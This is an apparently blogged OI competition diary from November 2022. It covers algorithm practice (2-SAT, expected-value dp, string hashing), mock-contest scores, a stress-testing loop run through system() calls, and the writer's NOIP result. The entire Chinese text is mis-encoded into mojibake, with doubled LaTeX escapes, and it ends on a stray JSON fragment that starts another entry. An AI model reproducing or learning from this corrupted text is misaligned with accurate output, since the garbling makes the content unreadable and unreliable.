æœ‰æœºåŒ–å­¦ä¹‹ç¥å¶å°”ä¼šåšä½œå¼Š è¾¹åŒè¿é€šåˆ†é‡ç¼©ç‚¹åæ±‚ $\\texttt{LCA}$ï¼Œæ„Ÿè§‰ä¹Ÿå¾ˆå¥—è·¯ï¼Œå°±å½“å¤ä¹ ä¸€ä¸‹ã€‚ P1491 é›†åˆä½ç½® P2865 [USACO06NOV]Roadblocks G ä¸¤é¢˜å‡å’Œæ¬¡çŸ­è·¯æœ‰å…³ï¼Œè€Œä¸‹é¢çš„å…è®¸é‡å¤èµ°ä¸€æ¡è¾¹ã€‚å› æ­¤å‰è€…æ¯æ¬¡åˆ ä¸€æ¡è¾¹åè·‘æœ€çŸ­è·¯ï¼Œåè€…éå†æšä¸¾æ¯ä¸€æ¡æœªåˆ çš„è¾¹è®¡ç®— $dis1_u + dis2_v + val_i$ çš„æœ€å°å€¼ã€‚ Too Many Constraints ä¸ [ABC277Ex] Constrained Sums éƒ½æ˜¯ $\\texttt{2-SAT}$ çš„é¢˜ç›®ï¼Œéš¾ç‚¹éƒ½åœ¨äºå°†çº¦æŸæ¡ä»¶è½¬æ¢ä¸ºè¿è¾¹ï¼Œæœ€åè·‘ tarjan æ˜¯å¥—è·¯ã€‚ç»†èŠ‚å¾ˆå¤šï¼Œè°ƒäº†æ•´æ•´ä¸€å¤©ã€‚ å®˜æ–¹åˆ†æ•°çº¿å‡ºäº†ï¼Œè¢«å¡åœ¨ $\\texttt{2=}$ çš„å‰å‡ åï¼ˆ$\\texttt{ZJ-OIer}$ ä¹‹ç—›å•Šå‘œå‘œå‘œï¼‰ã€‚ä¸è¿‡å¥½åœ¨æœ‰å‰ $20\\%$ï¼ˆå”¯ä¸€èƒ½åŒºåˆ† $\\texttt{70 pts}$ä¹Ÿèƒ½å¤Ÿ $\\texttt{2=}$ çš„ $\\texttt{OIer}$ äº†ï¼‰ï¼Œæ™šä¸Šè“å‹¾åˆ°è´¦ï¼Œå’•å€¼æ’åä¸Šå‡åˆ° $\\texttt{rk 49}$ äº†ï¼Œå¥½è€¶ï¼ï¼ï¼ $\\texttt{2022.11.18}$å­¦ä¸€ç‚¹ä¹‹å‰ä¸€ç›´æ²¡ææ‡‚çš„æœŸæœ› $\\texttt{dp}$ã€‚ FAVDICE - Favorite Dice åŒ P1291 [SHOI2002] ç™¾äº‹ä¸–ç•Œæ¯ä¹‹æ—… å†åŒ ä¼˜æƒ åˆ¸ Coupons è®¾ $f_i$ è¡¨ç¤ºå·²ç»æ‰”äº† $i$ é¢åï¼Œè¿˜éœ€ä»çš„æ¬¡æ•°çš„æœŸæœ›ã€‚åˆ™ $f_i = \\dfrac{i}{n} \\times f_i + \\dfrac{n - i}{n}\\times f_{i + 1}$ï¼Œå³ $f_i = f_{i + 1} + \\dfrac{n}{n - i}$ï¼Œå†æ¬¡è½¬æ¢çŸ¥ $f_i = f_{i + 1} + \\dfrac{n}{i}$ã€‚ P4550 æ”¶é›†é‚®ç¥¨ å’Œä¸Šä¸€é¢˜æœ‰äº›ç›¸ä¼¼ $f_i = f_{i + 1} + \\dfrac{n - i}{i},g_i = \\dfrac{i}{n} \\times (f_i + g_i + 1) + \\dfrac{n - i}{n} \\times (f_{i + 1} + g_{i + 1} + 1) = g_{i + 1} + f_{i + 1} + \\dfrac{i}{n - i} \\times f_i + \\dfrac{n}{n - i}$ï¼Œç›´æ¥é€’æ¨æ±‚è§£ã€‚ P2719 æç¬‘ä¸–ç•Œæ¯ $f_{i,j}$ è¡¨ç¤ºåˆ†åˆ«å‰©ä¸‹ $i$ ä¸ $j$ å¼ æ—¶çš„ç¥¨æ—¶ï¼Œæœ€åä¸¤å¼ ç¥¨ç›¸åŒçš„æ¦‚ç‡ï¼Œåˆ™åœ¨ $i 1,j 1$ æ—¶å‡ä¸º $\\frac{1}{2}$ çš„æ¦‚ç‡è½¬ç§»ï¼Œæ³¨æ„è¾¹ç•Œæ¡ä»¶çš„åˆ¤æ–­ã€‚ P3802 å°é­”å¥³å¸•çª $7$ ä¸ªä¸€ç»„è¿›è¡Œåˆ†æä¸”äº’ä¸å¹²æ‰°ï¼Œæ‰€ä»¥å…±æœ‰ $n - 6$ ç»„ $p = (n - 6) \\times E(x) = (n - 6) \\times \\dfrac{7! \\times a_1 \\times a_2 \\times \\cdots \\times a_7}{n \\times (n - 1) \\times \\cdots \\times(n - 6)}$ï¼ŒåŒ–ç®€ä¸€ä¸‹ç›´æ¥å†™å°±è¡Œäº†ã€‚ å†™ä¸€é“æœ‰å…³çŸ©é˜µä¹˜æ³•ä¼˜åŒ–çš„ $\\texttt{dp}$ã€‚ P3176 [HAOI2015]æ•°å­—ä¸²æ‹†åˆ† å†™äº†ç¯‡é¢˜è§£ã€‚ å¹³è¡¡æ ‘ä¸‹å‘¨å†çœ‹ä¸€ä¸‹å§ï¼Œå¸Œæœ›åˆ«é¸½ã€‚ $\\texttt{2022.11.19}$æ‰“æ´›è°·çš„ $\\texttt{NOIP}$ æ¨¡æ‹Ÿèµ›ã€‚ ç¬¬ä¸€é¢˜å®¹æ˜“å‘ç°ç­”æ¡ˆä¸º $2/3/4$ï¼Œ$2$ éå¸¸å®¹æ˜“åˆ¤æ–­ï¼Œç”¨äºŒä½å‰ç¼€å’Œå¤„ç† $3 / 4$ çš„æƒ…å†µå¯ä»¥æ‹¿åˆ° $\\texttt{80 pts}$ï¼ˆä½†æ˜¯èµ›åè¯æ˜æ•°æ®è¿‡æ°´ï¼Œç‰¹åˆ¤èƒ½ç›´æ¥è¿‡ï¼‰ã€‚èµ›æ—¶åˆæƒ³åˆ°ä¸€ä¸ªæ ‘çŠ¶æ•°ç»„ç»´æŠ¤å·¦ä¸Šè§’å’Œå³ä¸‹è§’çš„çŸ©å½¢çš„æƒ…å†µï¼Œç”±äºæŠ˜ç‚¹ä¸ä¸€å®šæ˜¯æ•´æ•°ï¼Œæ‰€ä»¥è¿˜è¦åŠ ä¸€ä¸ªäºŒåˆ†åˆ¤æ–­ã€‚å†™äº†å¥½ä¹…è¿‡äº†å¤§æ ·ä¾‹ï¼Œåº”è¯¥æ²¡å•¥é—®é¢˜ã€‚ ç¬¬äºŒé¢˜ $ty = 1$ çš„ç‚¹å¼‚å¸¸å¥½åšï¼Œç›´æ¥è®¡æ•° $\\texttt{dp}$ï¼Œä½†æ˜¯å› ä¸ºå¿˜è®°å–æ¨¡è°ƒäº†å¥½ä¹…ã€‚å¯¹äº $ty = 2$ çš„æ²¡å•¥æƒ³æ³•ã€‚ ç¬¬ä¸‰é¢˜ï¼Œä¸ä¼šï¼Œç›´æ¥å†™äº†æš´åŠ›ã€‚ ç¬¬å››é¢˜ï¼Œæ²¡å•¥æƒ³æ³•ï¼Œä¹Ÿæ˜¯æš´åŠ›ã€‚å‘ç°ç¬¬äºŒä¸ªå­ä»»åŠ¡å¯åšï¼Œä½†æ˜¯è§‰å¾—æœ‰ç‚¹çƒ¦å°±æ²¡å†™ã€‚ æœ€åå¾—åˆ† $100 + 50 + 30 + 8 = 188$ï¼Œ$\\texttt{rk 42}$ï¼Œæ„Ÿè§‰è¿˜è¡Œï¼ˆä½†æ˜¯æ„Ÿè§‰éš¾åº¦åé«˜ï¼‰ï¼Œç¬¬ä¸‰é¢˜æœ‰ $\\texttt{30 pts}$ çœŸä¸é”™ã€‚ $\\texttt{2022.11.20}$æ ¡å†…æ¨¡æ‹Ÿèµ›ã€‚ $\\texttt{T1}$ æ’åºã€‚ ã€ç®€è¦é¢˜æ„ã€‘ åªèƒ½å°†æ’åˆ—ä»ä¸Šå¾€ä¸‹ $k$ å±‚è¿›è¡Œå½’å¹¶æ’åºï¼Œå…¶ä½™åªèƒ½å•çº¯çš„åˆå¹¶ï¼Œæ±‚èƒ½ä½¿å…¶æœ‰åºçš„æ’åˆ—æ•°é‡ã€‚ æœ€å¤šåªèƒ½é€’å½’åˆ°ç¬¬ $k$ å±‚ï¼Œæ‰€ä»¥äºŒåˆ†å¤„ç†ï¼Œåˆ°è¾¾è¯¥å±‚æ—¶çš„æŸæ®µåŒºé—´ä¸º $[l,r]$ï¼Œå½“å‰è¿˜æœ‰ $m$ ä¸ªæ•°å¯ä»¥é€‰ï¼Œåˆ™è¿™ä¸€æ®µåŒºé—´å¯ä»¥é€‰çš„æ•°é‡ä¸º $C_m^{r - l + 1}$ï¼Œå¤„ç†å®Œåå‰©ä¸‹çš„æ•°å‡å°‘ $m$ ä¸ªã€‚å½“ç„¶ï¼Œéœ€è¦å¤„ç†æœªåˆ°ç¬¬ $k$ å±‚æ—¶å°±å‡ºç° $l = r$ çš„æƒ…å†µã€‚æ‰€ä»¥è¯´åªéœ€è¦å»å¤„ç†å‡ºç»„åˆæ•°ï¼Œç„¶åå°±èƒ½é€’å½’æ±‚è§£ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n + tn)$ã€‚ $\\texttt{T2}$ æ—…è¡Œã€‚ ã€ç®€è¦é¢˜æ„ã€‘ ä»ä¸€å¼ å•å‘å›¾ä¸­é€‰è‹¥å¹²ç‚¹ï¼Œä½¿å¾—å­˜åœ¨ä¸€æ¡ $s \\to t \\to s$ çš„è·¯å¾„ä¸”ç‚¹æƒæœ€å°ã€‚ åº”è¯¥æ˜¯ $\\texttt{dp}$ï¼Œä½†æ˜¯ä¸çŸ¥é“å¦‚ä½•å¤„ç†æ¥å›ç»è¿‡é‡å¤ç‚¹çš„æƒ…å†µã€‚æœ€åå°±å†™äº†ä¸€ä¸ªæœ€çŸ­è·¯ä¸çŠ¶å‹æ¥æ‹¿äº† $n \\le 10$ çš„éƒ¨åˆ†åˆ†ã€‚ $\\texttt{T3}$ æ•™å®¤ã€‚ ã€ç®€è¦é¢˜æ„ã€‘ æ¯ä¸€ä¸ªç‚¹çš„æƒå€¼ä¸º $0/1$ï¼ŒçŠ¶æ€ä¸º $0/1/2/3$ã€‚çŠ¶æ€ä¸º $0$ æ—¶è¡¨ç¤ºæƒå€¼ä¸€å®šä¸º $1$ï¼ŒçŠ¶æ€ä¸º $i(i \\in [1,3])$ æ—¶è¡¨ç¤ºç‚¹å·¦ä¾§ç›¸å…³çš„ä¸‰ä¸ªç‚¹ï¼ˆå·¦/ä¸Š/å·¦ä¸Šï¼‰è‡³å°‘æœ‰ $i$ ä¸ªç‚¹çš„æƒå€¼ä¸º $1$æ—¶è¯¥ç‚¹çš„æƒå€¼æ‰æœ‰ $\\frac{1}{2}$ çš„å¯èƒ½ä¸º $1$ã€‚æ±‚æ‰€æœ‰ç‚¹æƒå’Œçš„æœŸæœ›å€¼ã€‚ æŒ‰é¡ºåºæ‰«ï¼Œå¯¹äºæ¯ä¸ªç‚¹çš„æƒ…å†µå®¹æ–¥æ±‚è§£ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ—¶åˆ†ç±»å»å†™æœŸæœ›å€¼ï¼Œå†™æˆäº†ä¸€ä¸ª $O(nm)$ çš„ç¨‹åºï¼Œèƒ½è¿‡ç¬¬ä¸€ä¸ªæ ·ä¾‹ï¼Œä½†æ˜¯æ€ä¹ˆéƒ½è¿‡ä¸äº†ç¬¬äºŒä¸ªï¼Œä¸€ç›´æ²¡æƒ³é€šæ‰€ä»¥æœ€åå°±æ²¡æ”¹äº†ã€‚ ä¸å·¨ä½¬ $\\texttt{CENRUIYANG}$ è®¨è®ºåæ€»ç®—çŸ¥é“é—®é¢˜å‡ºåœ¨å“ªé‡Œã€‚æ¯ä¸ªç‚¹çš„è®¡ç®—ä¸èƒ½ç®€å•çš„ä¾èµ–å·¦ä¾§ä¸‰ç‚¹çš„æ¦‚ç‡ï¼Œå› ä¸ºä¹‹å‰çš„ç‚¹å¯èƒ½ä¼šå¯¼è‡´æŸäº› $1$ ä¸å¯èƒ½å‡ºç°ï¼Œæ€»ç®—æ˜ç™½æ­£è§£ä¸ºå•¥æ˜¯å¤æ‚çš„çŠ¶å‹åŠ è½®å»“çº¿ $\\texttt{dp}$ äº†ã€‚ $\\texttt{hack}$ æ•°æ®ï¼Œå…³æ³¨å³ä¸‹è§’çš„ç‚¹ã€‚ 2 30 1 13 3 1 $\\texttt{T4}$ æ•°æ ‘ã€‚ ã€ç®€è¦é¢˜æ„ã€‘ è®¾ $dis(x,y)$ è¡¨ç¤ºä¸¤ç‚¹é—´çš„æœ€çŸ­è·¯å¾„ã€‚ç»™å®šä¸€æ£µæ ‘ï¼Œæ±‚äº’å¼‚ä¸‰å…ƒç»„ $(a,b,c)$ æ»¡è¶³ $dis(a,b) \\le k,dis(a,c) \\le k,dis (b,c) \\le k$ çš„ä¸ªæ•°ã€‚ ä¸€çœ‹å°±å¾ˆå¤æ‚ï¼Œå†™äº†ä¸ªé¢„å¤„ç† $LCA(x,y)$ çš„ $O(n^3)$ æš´åŠ›å’Œå¤„ç†é“¾çš„ $O(n^2)$ å°±æ²¡æœ‰å†å¤šçªç ´äº†ã€‚ æœ€åå¾—åˆ†ï¼š$100 + 40 + 30 + 50 = 220$ï¼Œæ²¡æœ‰æŒ‚åˆ†è¿™æ˜¯å¥½çš„ï¼Œä½†æ˜¯æ²¡å†™å‡º $\\texttt{T2}$ è¿™æ˜¯ç³Ÿçš„ã€‚ $\\texttt{2022.11.22}$ä¿¡å¿ƒèµ›ï¼Œå››é“é¢˜åæ¥éƒ½åœ¨æ´›è°·ä¸Šæ‰¾åˆ°äº†ã€‚ P1161 å¼€ç¯ æ˜“çŸ¥ $x \\oplus y \\oplus y = x$ï¼Œæ‰€ä»¥å…¨éƒ¨å¼‚æˆ–èµ·æ¥å³å¯ã€‚ P1174 æ‰“ç –å— $\\texttt{50 pts}$ çš„ $\\texttt{dp}$ ååˆ†å¥½å†™ï¼Œ$dp_{i,j} = dp_{i - 1,j - s} + sum_{i,s}$ï¼Œå¤„ç†ä¸€ä¸ªå‰ç¼€å’Œå³å¯ã€‚è¿™é¢˜å°±éº»çƒ¦åœ¨é‡åˆ° Y æ—¶åªèµšä¸äºï¼Œæ‰€ä»¥å¯ä»¥â€œå€Ÿâ€å­å¼¹ç„¶åå½’è¿˜ï¼ˆç„¶è€Œå‰ææ˜¯èƒ½å¤Ÿå€Ÿåˆ°ï¼‰ã€‚æ‰“çš„æ—¶å€™è¿‡äº†æ ·ä¾‹ï¼Œä½†æ˜¯æµ‹çš„æ—¶å€™å‘ç°è¿˜æ˜¯å†™é”™äº†ã€‚ P1950 é•¿æ–¹å½¢ åªè¦æ‰¾åˆ°ä¸é‡å¤ç»Ÿè®¡çš„æ–¹å¼ï¼Œç„¶åç›´æ¥å•è°ƒæ ˆä¼˜åŒ–å³å¯ï¼ˆæœºæˆ¿å¥½åƒè¿˜æœ‰äººå†™å‡ºäº† $\\texttt{dp}$ åšæ³•ï¼‰ã€‚ P1462 é€šå¾€å¥¥æ ¼ç‘ç›çš„é“è·¯ å‰å‡ å¤©åˆšåšè¿‡ï¼Œç›´æ¥äºŒåˆ†åŠ ä¸Šæœ€çŸ­è·¯ã€‚ æœ€åå¾—åˆ†ï¼Œ$100 + 50 + 100 + 100 = 350$ã€‚ $\\texttt{2022.11.23}$è€ƒå‰æœ€åä¸€åœºæ¨¡æ‹Ÿèµ›ã€‚ $\\texttt{T1 seg}$ ã€ç®€è¦é¢˜æ„ã€‘$n$ ä¸ªç‚¹æ€»å…±ç»„æˆ $\\frac{n(n + 1)}{2}$ æ¡çº¿æ®µï¼ˆå¯èƒ½é€€åŒ–æˆç‚¹ï¼‰ï¼Œçº¿æ®µå¯ä»¥å­˜åœ¨æˆ–ä¸å­˜åœ¨ï¼Œæ±‚æœ‰å¤šå°‘ç§çº¿æ®µå­˜åœ¨çš„æ–¹æ¡ˆæ»¡è¶³èƒ½å¤Ÿæœ€å¤§åŒ–é€‰æ‹© $k$ æ¡çº¿æ®µä½¿å…¶äº’ä¸é‡å ã€‚ åŸºäºè´ªå¿ƒæ€æƒ³çš„è®¡æ•° $\\texttt{dp}$ã€‚ç”¨ $dp_{i,j}$ è¡¨ç¤º $[1,i]$ é€‰æ‹© $j$ æ¡çº¿æ®µï¼Œç¬¬ $j$ çº¿æ®µçš„å³ç«¯ç‚¹é€‰åœ¨ $i$ çš„æ–¹æ¡ˆæ•°ã€‚å¯¹äº $\\forall l \\in (p,i]$ çš„æ‰€æœ‰çº¿æ®µï¼Œå¯¹å³ç«¯ç‚¹è¿›è¡Œåˆ†ç±»ã€‚è‹¥ $r \\in (i,n)$ è¿™äº›çº¿æ®µåœ¨ä¹‹å‰å·²ç»è¢«è®¡ç®—è¿‡ï¼Œç”±äºå¾€åè¿›è¡Œ $\\texttt{dp}$ï¼Œä¸éœ€è¦é‡å¤è®¡ç®—ï¼›æœ‰ä¸€æ¡ $r = i$ çš„å¯é€‰çº¿æ®µçš„æ–¹æ¡ˆæ•°ä¸º $2 ^ {i - (p - 1) + 1} - 1 = 2 ^ {i - p} - 1$ï¼›$r \\in (i,n]$ çš„çº¿æ®µï¼Œå³ä½¿å­˜åœ¨æ­¤æ—¶ä¹Ÿä¸é€‰æ‹©ï¼Œæ–¹æ¡ˆæ•°ä¸º $2 ^ {(i - p) \\times (n - i)}$ã€‚é¢„å¤„ç† $2$ çš„å¹‚æ¬¡å³å¯ã€‚ $\\texttt{T2 calc}$ ã€ç®€è¦é¢˜æ„ã€‘ æ±‚ $[1,n]$ ä¸­ä¸èƒ½è¢« $\\forall i \\in k,a_i$ ä¸­æ•´é™¤çš„æ•°çš„ä¸ªæ•°ï¼ˆ$a_i$ ä¸¤ä¸¤äº’è´¨ï¼‰ã€‚ å†™é€’æ¨å¼ï¼Œ$f_{n,k} = f_{n,k - 1} + \\lfloor \\frac{n}{a_k} \\rfloor - f_{\\lfloor \\frac{n}{a_k} \\rfloor,k - 1}$ã€‚ç”±æ•°è®ºåˆ†å—å¯çŸ¥ï¼Œä¸åŒçš„ä¸‹å–æ•´çš„æ•°ä¸ä¼šå¤ªå¤šï¼Œæ‰€ä»¥ç›´æ¥å†™äº†è®°å¿†åŒ–ã€‚äº¤ä¸Šå»æ—¶ $80$ï¼Œçœ‹äº†é¢˜è§£å‘ç°å¤§äºæŸä¸€ä¸ªæ•°æ—¶å¯ä»¥ä¸è¢«è®°å¿†åŒ–è€Œç›´æ¥è¢«è®¡ç®—ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ•°ç»„ä»£æ›¿ mapï¼ŒèŠ‚çœç©ºé—´ä¸æ—¶é—´ã€‚ $\\texttt{T3 ball}$ ã€ç®€è¦é¢˜æ„ã€‘ ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„ $01$ ä¸²ï¼Œè¿›è¡ŒåŒºé—´ $0 \\to 1,1 \\to 0$ çš„æ“ä½œï¼Œæ¯æ¬¡æ“ä½œä¿ç•™ï¼Œç„¶åè¿›è¡ŒæŸ¥è¯¢æœ€é•¿çš„ $00 \\cdots 011 \\cdots 1$ çš„ä¸²çš„é•¿åº¦ï¼ˆå¯ä»¥æ²¡æœ‰ $0$ æˆ– $1$ï¼‰ã€‚ çº¿æ®µæ ‘ç»´æŠ¤åŒºé—´ä¸¤ä¸ªç«¯ç‚¹æœ€é•¿åŒè‰²ä¸²çš„ç±»å‹ä¸é•¿åº¦ï¼ŒåŒºé—´ä¸¤ä¸ªç«¯ç‚¹æœ€é•¿ $01$ æˆ– $10$ ä¸²çš„é•¿åº¦ï¼ŒåŒºé—´æœ€é•¿ $01$ ä¸ $10$ ä¸²çš„é•¿åº¦ã€‚åˆå¹¶æ—¶å¤„ç†å®Œç«¯ç‚¹åè€ƒè™‘å·¦å³ä¸¤ä¸ªåŒºé—´çš„ä¸­é—´éƒ¨åˆ†çš„ç­”æ¡ˆå¯¹æ•´ä¸ªåŒºé—´äº§ç”Ÿçš„å½±å“ã€‚åŒºé—´è¿›è¡Œç¿»è½¬ç›´æ¥æ‰“æ ‡è®°å³å¯ï¼Œç„¶åä¸‹ä¼ çš„åŒæ—¶æ”¹å˜ä¸²çš„ç±»å‹ï¼Œäº¤æ¢ $01$ ä¸ $10$ ä¸²çš„ç­”æ¡ˆå³å¯ã€‚èµ›æ—¶æ²¡è°ƒå‡ºæ¥ï¼Œåªäº¤äº†ä¸€ä¸ªæš´åŠ› $\\texttt{qwq}$ã€‚ $\\texttt{T4 array}$ ã€ç®€è¦é¢˜æ„ã€‘ æ„é€ æ•°åˆ— $A$ï¼Œæ–¹æ³•ä¸ºï¼šä¸æ–­é‡å¤ $k$ æ¬¡å°† $\\rm{Mex\\{A\\}}$ æ’å…¥ $A$ æœ«å°¾ï¼Œç„¶åå°†è¿™ $k$ ä¸ªæ•°çš„å’Œæ’å…¥ $A$ æœ«å°¾ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ±‚ $n$ çš„æ•°åˆ—ä¸­çš„ä½ç½®ã€‚ æ²¡æƒ³æ³•ï¼Œå†™äº†æš´åŠ›ã€‚èµ›åçœ‹äº†é¢˜è§£è¿˜æ˜¯ä¸ä¼šï¼ŒåªçŸ¥é“æ˜¯æ•°å­¦æ¨å¼å­é¢˜ã€‚ æœ€åå¾—åˆ†ï¼Œ$100 + 80 + 20 + 20 = 220$ã€‚ $\\texttt{2022.11.24}$åšåš $\\texttt{NOIP 2020}$ï¼Œå¹¶å€Ÿé¢˜å¤ä¹ ä¸€ä¸‹æœ€åä¸€å—â€”å­—ç¬¦ä¸²ç®—æ³•ã€‚ P7114 [NOIP2020] å­—ç¬¦ä¸²åŒ¹é… é¢„å¤„ç†å‰åç¼€å‡ºç°å¥‡æ•°æ¬¡çš„å­—ç¬¦æ•°é‡ï¼Œç„¶åæšä¸¾ $AB$ï¼Œç”±äºåªæœ‰ $26$ ä¸ªå­—æ¯ï¼Œåœ¨åˆ¤æ–­ $C$ æ—¶ç›´æ¥ç”¨æ ‘çŠ¶æ•°ç»„æ±‚å‡ºç¬¦åˆæ¡ä»¶çš„ $A$ çš„ä¸ªæ•°ï¼Œæšä¸¾ $AB$ å‡ºç°çš„æ¬¡æ•°é‡‡ç”¨äº†å“ˆå¸Œã€‚æœ€åå‘ç°å¼€ $O2$ æ‰èƒ½è¿‡ï¼Œç”±äºç°åœ¨æ¯”èµ›è‡ªå¼€ $O2$ï¼Œæ‰€ä»¥å°±æ²¡äº‹äº†ã€‚ P6739 [BalticOI 2014 Day1] Three Friends å“ˆå¸Œåˆ¤é‡ï¼Œå”¯ä¸€çš„å‘ç‚¹å°±æ˜¯å¤šè§£æ˜¯æŒ‡å¾—åˆ°çš„ $S$ ä¸å”¯ä¸€è€Œä¸æ˜¯æ–¹å¼ä¸å”¯ä¸€ï¼ˆå¯èƒ½å¤šç§æ–¹å¼å‡å¾—åˆ°åŒä¸€ä¸ª $S$ï¼‰ã€‚ P3538 [POI2012]OKR-A Horrible Poem è‹¥ $f(l,r - len) = f(l + len,r)$ï¼Œåˆ™ $len$ ä¸ºä¸€ä¸ªå¯èƒ½çš„å¾ªç¯èŠ‚ï¼Œæ‰€ä»¥çº¿æ€§ç­›é¢„å¤„ç†æ¯ä¸ªæ•°å¯¹åº”çš„æœ€å°ç´ å› å­å³å¯ã€‚ æ€»ç»“ä¸€ä¸‹å“ˆå¸Œï¼ˆ$hsh$ è¡¨ç¤ºå“ˆå¸Œå€¼ï¼Œ$pw$ è¡¨ç¤ºæƒå€¼ï¼‰ï¼š ä» $s$ ä¸­æˆªå– $s[l:r]$ï¼Œå“ˆå¸Œå€¼ä¸º $hsh_r - hsh_{l-1} \\times pw_{r - l + 1}$ã€‚ å°† $1.$ çš„è®¡ç®—æ–¹å¼ç¼–å†™ä¸ºå‡½æ•° $f(x,y)$ï¼Œå°† $s$ ä¸­çš„ $s[sx:sy]$ ä¸ $s[fx:fy]$ åˆå¹¶ï¼Œå“ˆå¸Œå€¼ä¸º $f (sx,sy) \\times pw_{fy - fx + 1} + f (fx,fy)$ã€‚ ä¸è¦å¿˜è®° $pw_0 = 1$ çš„åˆå§‹åŒ–ã€‚ $\\texttt{2022.11.25}$ç»ƒä¹ éª—åˆ†/è°ƒè¯•å°æŠ€å·§ã€‚ æ‰“è¡¨ æ´›è°·æ—¥æŠ¥ã€Šæµ…è°ˆæ‰“è¡¨ä¸å…¶æŠ€å·§ã€‹ã€‚ã€æ³¨æ„ $\\texttt{CCF}$ çš„ä»£ç é•¿åº¦ä¸Šé™æ˜¯ $100KB$ã€‘ å…·æœ‰ä¸€èˆ¬æ€§çš„ï¼Œé€šè¿‡åˆ†å—æ‰“è¡¨æ¥ç¼©å‡è¡¨é•¿ï¼Œå°†æœç´¢ä¸è¡¨ç›¸ç»“åˆï¼Œä»è€Œä¼˜åŒ–ä»£ç ã€‚ P2567 [SCOI2010]å¹¸è¿æ•°å­— æœç´¢å‡ºå¹¸è¿æ•°åªæœ‰ $2000$ ä¸ªå·¦å³ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¿™äº›å¹¸è¿æ•°è¿›è¡Œæ‰“è¡¨ï¼Œå—é•¿è®¾ç½®åœ¨ $2 \\times 10^6$ è¾ƒä¸ºåˆé€‚ã€‚ P4318 å®Œå…¨å¹³æ–¹æ•° $5 \\times 10^5$ çš„è¡¨é•¿åŠ  $O2$ ç»ˆäºè¿‡äº†ã€‚å¦‚æœæƒ³è¦ä¸å¸æ°§å¹¶ä¸”åœ¨åˆç†é•¿åº¦å†…ï¼Œå¯ä»¥å°†è¡¨åŒå‡æŸä¸€ä¸ªæ•°ä»¥ç¼©å°é•¿åº¦ï¼Œæœ€ååŠ ä¸Šå³å¯ã€‚ å¯¹æ‹ é˜²æ­¢ .bat æ–‡ä»¶å‡ºé”™ï¼Œå†™æˆåœ¨ Dev-C++ å†…çš„å½¢å¼ã€‚ #includewindows.husing namespace std;int main() while(1) system(data.exe); system(bf.exe); system(sol.exe); if (system(fc bf.out sol.out)) break; æ¨¡æ‹Ÿé€€ç« é‡åšäº† P1433 åƒå¥¶é…ª ä¸è¿‡åªæ‹¿åˆ°ä¸€åŠçš„åˆ†ï¼Œä¸ç®¡äº†ï¼Œä¼šè¿™ä¸ªæ–¹æ³•å°±è¡Œã€‚ clock () - st 0.9 * CLOCKS_PER_SEC å¡æ—¶ï¼Œæ³¨æ„å‰é¢å•ä½æ˜¯ æ¯«ç§’ï¼Œåé¢æ˜¯ç§’ã€‚ åº”è¯•æŠ€å·§ çœ‹äº†çœ‹è¿™ç¯‡åšå®¢ã€‚ å¥½äº†ï¼Œå†™å®Œäº†ï¼Œæ˜å¤©æ¯”èµ›åŠ æ²¹å§ï¼$\\texttt{rp++!}$ $\\texttt{2022.11.26}$è¦å»æ‰“ $\\texttt{NOIP}$ äº†ã€‚ $\\texttt{T1}$ å…ˆå†™äº† $76$ï¼Œç„¶åæ‰“ç®—å†æ¬¡å‰ç¼€å’Œä¼˜åŒ–ï¼Œä½†æ˜¯ä¸€ç›´é”™å°±æ”¾ç€äº†ã€‚ç„¶åå¼€ $\\texttt{T2}$ï¼Œæƒ³åˆ°äº†æ„é€ è§£æ³•ï¼Œä¸€ç›´å°è¯•å®ç°ï¼Œä½†æ˜¯å®ç°ä¸å‡ºæ¥ï¼Œæ­¤æ—¶æ—¶é—´ä»…å‰© $\\texttt{1h}$ã€‚è¿™æ—¶å€™æ•´ä¸ªäººå·²ç»æ…Œäº†ï¼Œäºæ˜¯ $\\texttt{T3}$ çš„ tarjan å†™æŒ‚ï¼Œåªåœ¨æœ€åä¸€é¢˜æ‹¿äº† $8$ åˆ†ã€‚ é¢„ä¼° $76 + 15 + 0 + 8$ï¼Œå®æµ‹ç¬¬äºŒé¢˜çš„æš´åŠ›ä¹Ÿå†™é”™äº†ï¼Œäºæ˜¯å˜æˆ $84 \\texttt{pts}$ æ»šç²—ã€‚ æ¯”èµ›å¼€å§‹å‰æƒ³çš„æ˜¯å†™å®Œç¬¬ä¸€é¢˜å°±å»æ‰“æš´åŠ›ï¼Œä½†æ˜¯å®é™…å´æ˜¯æ­»ç£•ç¬¬äºŒé¢˜ï¼Œç„¶åæ²¡æ—¶é—´å†™æš´åŠ›ã€‚é€€å½¹å‰çš„æœ€åä¸€åœºæ¯”èµ›ç®—æ˜¯å®Œå…¨å¾—å´©äº†ã€‚ã€è¦æ˜¯å½“æ˜¯åŠªåŠ›è°ƒå®Œ $\\texttt{T1}$ï¼Œåé¢ç›´æ¥å†™éƒ¨åˆ†åˆ†ï¼Œé‚£ä¹ˆ $100 + 30-50 + 35+ 8$ å¹¶ä¸æ˜¯é—®é¢˜ï¼Œä¼°è®¡ä¹Ÿèƒ½æ‹¿ä¸ª $1=$ äº†ï¼Œç°åœ¨è¿ $2=$ éƒ½ä¸ä¿â€¦â€¦ã€‘ ã€updã€‘ å¥½å­ï¼Œè¿˜æœ‰äºŒç­‰ï¼Œè·ç¦»ä¸€ç­‰å°±å·®åœ¨äº†å†™æŒ‚çš„ $\\texttt{T2 T3}$ çš„æš´åŠ›åˆ†ä¸Šã€‚ åè®°ä¸æ–­æ‹¼æçš„ $\\texttt{OI}$ ç”Ÿæ¶¯ç®—æ˜¯ç»“æŸäº†ï¼Œä¸çŸ¥é“é«˜ä¸‰è¿™å¹´ä¼šä¸ä¼šæ¥ç©ç©ã€‚ã€ç»“å±€ï¼šé«˜ä¸‰è¿˜æ˜¯æ¥ç©å¹¶ä¸”åœ†æ¢¦ $\\texttt{1=}$ã€‘ ä¸€äº›å°ç»“å†™åˆ°è¯­æ–‡éšç¬”é‡Œäº†ï¼ˆä¸çŸ¥é“è¯­æ–‡è€å¸ˆèƒ½ä¸èƒ½æ¥å—æˆ‘çš„â€œèƒ¡è¨€ä¹±è¯­â€ï¼‰ï¼Œå•¥æ—¶å€™æ¬ç‚¹è¿‡æ¥ã€‚","categories":["Journal"]},{"title":"é¢˜è§£ï¼šP8509 